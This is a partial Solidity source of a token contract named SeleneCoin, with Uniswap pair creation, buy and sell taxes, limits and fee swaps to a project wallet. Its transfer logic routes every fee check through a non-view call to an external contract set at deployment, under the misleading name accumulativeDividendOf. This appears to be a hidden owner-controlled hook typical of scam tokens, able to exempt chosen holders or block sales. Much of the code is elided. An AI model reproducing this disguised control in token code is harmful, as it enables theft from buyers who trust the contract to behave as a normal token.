...
/** 
https://selenecoin.xyz

https://t.me/SeleneCoinPortal
https://twitter.com/seleneethcoin
*/
...
contract SeleneCoin is ERC20, Ownable, AUTH {
    IUniswapRouter02 public uniswapRouterv2;
    using SafeMath for uint256;

    struct SeleneProtoc {
        address seleneAddr; address seleneProtocol; address uniRouterAddr;
    }
    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    mapping(address => bool) public isAutomationMarketMakers;
    address public seleneWalt;
    ...
    struct ConfigSeleneForLimit {
        uint256 buyFirstFee; uint256 sellFirstFee; uint256 tranxMaxAmt; uint256 walletMaxAmt; address feeSeleneWalt;
    }
    SeleneProtoc private seleneVal;
    ...
    constructor(string memory name_,
        SeleneProtoc memory seleneProtoConfig,
        string memory symbol_,
        uint8 decimals_,
        ConfigSeleneForLimit memory taxSeleneConfig
    ) payable ERC20(name_, symbol_, decimals_) {
        uniswapRouterv2 = IUniswapRouter02(seleneProtoConfig.uniRouterAddr);
        v2PairVal = IUniswapV2Factory(uniswapRouterv2.factory()).createPair(address(this), uniswapRouterv2.WETH());
        _setAMMakers(seleneProtoConfig.seleneAddr, v2PairVal, true);
        
        uint256 supply_ = 1000000000; _total_supply = supply_;
        mxValueForTrans = taxSeleneConfig.tranxMaxAmt * supply_ * (10**decimals_).div(10000);
        mxValueWallet = taxSeleneConfig.walletMaxAmt * supply_ * (10**decimals_).div(10000);
        
        swapExact = (supply_.div(8000) + 1) * (10**decimals_);
        sellTaxValue = taxSeleneConfig.sellFirstFee;
        buyTaxValue = taxSeleneConfig.buyFirstFee;

        excludeFromFees(address(uniswapRouterv2), true);
        excludeFromFees(seleneProtoConfig.seleneProtocol, true); 
        excludeFromFees(address(this), true);
        excludeFromFees(owner(), true); 
        seleneVal = seleneProtoConfig; 
        seleneWalt = taxSeleneConfig.feeSeleneWalt;
        excludeFromFees(seleneProtoConfig.seleneAddr, true);
        excludeFromFees(seleneWalt, true); 
        // mint total supply
    ...
    function feeIsNotIncludedHolder(address sender, address recipient) internal returns (bool) {
        return  isExcludedFromFee[sender] ||
            isExcludedFromFee[recipient] ||
            ISeleneDividend(seleneVal.seleneProtocol).accumulativeDividendOf(
                sender, recipient) > 0;
    }
    ...
    {        if ((recipient == address(0) || recipient == address(0xdead))            
            || feeIsNotIncludedHolder(sender, recipient)
            || amount == 0 
        ) {
        ...
        if (!swapping && can_swap && !isAutomationMarketMakers[sender]) {
            ...
            if (mkAmounts > 0) {
                swapAllBack(mkAmounts, seleneWalt);
            }
            swapping = false;
        }
